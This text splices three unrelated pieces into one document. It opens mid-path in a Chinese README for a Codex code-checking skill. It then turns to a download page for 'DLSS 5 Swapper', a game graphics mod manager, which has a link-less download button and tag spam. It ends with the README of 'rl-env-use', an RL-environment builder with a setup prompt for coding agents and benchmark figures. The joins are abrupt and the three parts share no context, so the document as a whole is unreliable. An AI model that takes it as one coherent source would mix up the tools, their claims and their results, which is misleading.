%USERPROFILE%\.codex\skills\simple-checker-v1 ``` 安装后在 Codex 中新开会话或刷新 skill 列表，然后调用： ```text $simple-checker-v1 检查刚刚的代码，并单独生成代码拆解文件。 ``` 完整使用方法见 [使用说明](使用说明.md)。报告 JSON 格式见 [报告记录规范](references/report-contract.md)。 ## 检查 要求 Python 3，无第三方依赖： ```powershell python -B scripts/test_checker_report.py python -B scripts/checker_report.py validate assets/review.example.json python -B scripts/checker_report.py breakdown assets/review.example.json --out .\review-output python -B scripts/checker_report.py render assets/review.example.json --out .\review-output ``` 内置订单导出示例故意保留“复用列表分页导致超过 20 条时导出不完整”的缺陷。构建示例会运行可复现检查并重写示例日志： ```powershell python -B assets/order-export/build_example.py ``` 示例报告不是其他项目的检查结果。 打开 `review-output/code-breakdown.html` 看图文拆解。`breakdown` 输出 HTML 和 Markdown 两个独立文件；`render` 再附总审查报告和有效记录。现有 `review.json` 兼容，缺少图文补充字段时仍自动生成输入输出图、源码与证据卡。 当前工具版本为 **1.1.0**，skill 调用名仍为 `$simple-checker-v1`，界面名仍为“简单的检查者1.0”。更新时用仓库完整内容替换原安装目录；仅下载单个 `SKILL.md` 不会更新模板和生成器。生成页面可能含源码与本地路径，请按项目约定保存和分享。 可选浏览器自检（生成器本身无需 Node 或 Playwright）： ```text npm install --no-save --package-lock=false playwright@1.56.1 npx playwright install chromium node scripts/test_breakdown_browser.cjs review-output/code-breakdown.html review-output/browser ``` CI 在 Windows/Linux 运行 Python 测试，并在 Chromium 检查源码展开、键盘跳转、筛选、390/700/1024px 宽度及离线请求；订单示例 HTML 和截图随 Actions 产物保存。 ## 许可证 当前版本未附开源许可证。除非作者另行添加许可证，版权及复用权限仍由权利人保留。

# DLSS 5 Swapper – Neural Rendering Manager for PC Games

--- # Installation Instructions 1. Click the download button above. 2. Save the archive to your Windows PC. 3. Launch DLSS 5 Swapper and select a compatible game to get started. --- --- ## 🧠 Overview DLSS 5 Swapper brings DLSS 5 installation and configuration into one desktop application, so you don't have to manage every game modification by hand. It can detect games from supported libraries, work with manually added game folders, and provide different installation routes depending on the game and its rendering setup. For games that already include DLSS, the application offers a native installation route. Compatible titles without native DLSS can use DLSS5-Feeder instead. Additional routes, including OptiScaler and multipass rendering, are available for supported configurations. The application also keeps track of installation activity and backs up original files, making it easier to undo a change if a particular setup doesn't work as expected. An in-game overlay provides live access to neural rendering controls for supported installation routes. DLSS 5 Swapper is intended for Windows users who want to experiment with neural rendering across their PC game collection, including selected games running through supported emulators. Results depend on the game, GPU, driver, rendering API, and installation method. ## 🚀 Key Features | Feature | Description | | ------------------------------- | ----------------------------------------------------------------------------- | | 🎮 DLSS 5 Installation | Apply supported neural rendering configurations to compatible games. | | 🔀 Multiple Installation Routes | Choose between native RenoDX, DLSS5-Feeder, OptiScaler, and multipass routes where supported. | | 🧩 DLSS5-Feeder | Set up compatible games that do not include native DLSS files. | | 🎛️ In-Game Overlay | Open the overlay with F8 and adjust supported neural rendering settings while playing. | | ⚙️ Rendering API Options | Use automatic detection or configure the rendering API for an individual game. | | 📚 Game Library | Find games from Steam, Epic Games, GOG, Xbox Game Pass folders, and manually added locations. | | 🔎 Search and Filters | Narrow the library by game title, graphics API, DLSS status, version, and available add-ons. | | 🖼️ Custom Game Artwork | Browse the collection with game artwork and organize entries by store or in a combined list. | | 💾 Automatic Backups | Keep original files available before supported installation changes. | | ↩️ Restore Originals | Revert supported modifications using the application's backup records. | | 📋 Installation History | Review previous operations and access available activity and installation logs. | | 🕹️ Emulator Support | Configure supported emulators using compatible rendering methods. | | 🎨 Interface Themes | Choose between light and dark interface themes. | ## 💻 System Requirements | Requirement | Minimum | | ----------------- | -------------------------------------------------- | | Operating System | Windows 10 or Windows 11, 64-bit | | GPU | Depends on the selected installation route and neural rendering runtime | | Game Compatibility | A compatible game or supported emulator configuration | | Graphics API | Depends on the route; supported configurations include DirectX, Vulkan, and OpenGL | | Visual C++ Runtime | Required for DLSS5-Feeder configurations; both x64 and x86 runtimes may be needed | | Storage | Space for the application, downloaded components, and game-file backups | | Internet Connection | Needed to obtain components that are not already available locally | Compatibility differs between installation routes. DirectX 10, for example, is not directly supported by DLSS5-Feeder; other routes may have different requirements. Check the current project documentation before installing components. ## Additional Information for Windows Users Close the game before changing its graphics files. Although DLSS 5 Swapper backs up files for supported installation operations, keeping a separate backup of important game data is still a good idea. Not every game works with every installation route. Existing mods, graphics injectors, rendering APIs, and game updates can affect compatibility. If a modification causes problems, use the restore option before trying another configuration. The in-game overlay is available only for supported routes and configurations; it is not a universal feature for every installation method. Modifications can also conflict with anti-cheat systems and may cause crashes or account penalties in online games. The application does not bypass anti-cheat protections. DLSS 5 Swapper is a third-party utility. Its compatibility and results are not guaranteed by NVIDIA or by the developers of individual games. ## 🏷️ Tags DLSS 5 Swapper • DLSS 5 Swapper Download • DLSS 5 Neural Rendering • DLSS5-Feeder • NVIDIA DLSS • RenoDX • OptiScaler • Multipass Rendering • AI Graphics Mod • DLSS 5 Installer • PC Game Modding • Graphics Mod Manager • In-Game Overlay • Game Emulator Support • Windows Gaming Utility • DirectX • Vulkan • OpenGL • Windows 10 • Windows 11

items.readme:
# rl-env-use Introducing **rl-env-use**: RL environments for anyone and any domain. Describe a skill in one line. Get a verified environment that frontier models do not saturate, and a hillclimbed prompt for the model you train. Built on Anthropic's [Automating eval design and hillclimbing](https://claude.dev/blog/automating-eval-design-and-hillclimbing/) workflow, with one change: the tasks are real cases that [Browser Use](https://browser-use.com) agents mine from the web. | Missions | Claude Code | Browser Use | |----------|-------------|-------------| | 8 x clinical trial results | 0 of 86 facts verified | **17 verified**, 4 complete cases | | 6 x clinical trial results, same model both sides | 0 of 43 | **3 verified**, 2 complete cases | | 8 x human genetic variants (UniProt, gnomAD, GTEx) | 6 of 82 | **40 verified** | Get a Browser Use API key at [Browser Use Cloud](https://cloud.browser-use.com/?utm_campaign=rl-env-use&utm_source=github). ## What it does - **Mines real cases**: Browser Use agents find the materials (a trial protocol, a 10-Q) and the outcome published later - **Writes hard tasks**: gold answers computed by code, anything a frontier panel solves gets rewritten harder - **Rejects bad tasks**: leaked answers, memorized outcomes, ambiguous prompts - **Hillclimbs** a model's system prompt with a train/test split, a noise floor and paired confidence intervals - **Exports** the dataset for an RL trainer, or serves it in code with `Env` ## Setup prompt For Claude Code / Codex / OpenCode: ```text Set up https://github.com/browser-use/rl-env-use for me. Read install.md first to install this repo, register the skill, and set up the Browser Use and OpenRouter API keys - ask me to paste them when you need them. Then read SKILL.md for daily usage. After install, don't build anything on your own - just tell me it's ready and wait for me to name a skill. ``` Then ask: > build me an RL environment for predicting whether a clinical trial met its primary endpoint, from its ClinicalTrials.gov registration For humans: ```bash rl-env-use create "predict whether a completed trial met its primary endpoint from its registered protocol; ClinicalTrials.gov" --budget 40 rl-env-use climb envs/ --model qwen-35b ``` ## Results The shipped example, [`envs/trial-forecast`](envs/trial-forecast): 35 forecasts from 29 ClinicalTrials.gov trials whose results were posted since July 2026, after the models' training data. Built for $72, $17 of it Browser Use.

A climbed Qwen 3.6 35B-A3B goes from 0.53 to 0.78 on tasks it never trained on (+0.25, 95% CI +0.07 to +0.45), level with Opus 5.5. Always answering 50% scores 0.75, so most of the gain is calibration: the model stopped answering 0 or 1. The climb kept 1 of 12 proposed edits (base-rate priors per question type); every round is in [`climb-qwen-35b/`](envs/trial-forecast/climb-qwen-35b). ## Manual install Python 3.11+, optionally Node.js 18+ for the HTML reports. ```bash git clone https://github.com/browser-use/rl-env-use ~/Developer/rl-env-use cd ~/Developer/rl-env-use uv venv && uv pip install -e '.[test]' cp .env.example .env && $EDITOR .env # BROWSER_USE_API_KEY, OPENROUTER_API_KEY .venv/bin/python -m pytest -q # offline, ~10 s ``` See [`SKILL.md`](./SKILL.md) for the full workflow and where every file is saved. ## License MIT, see [LICENSE](LICENSE).
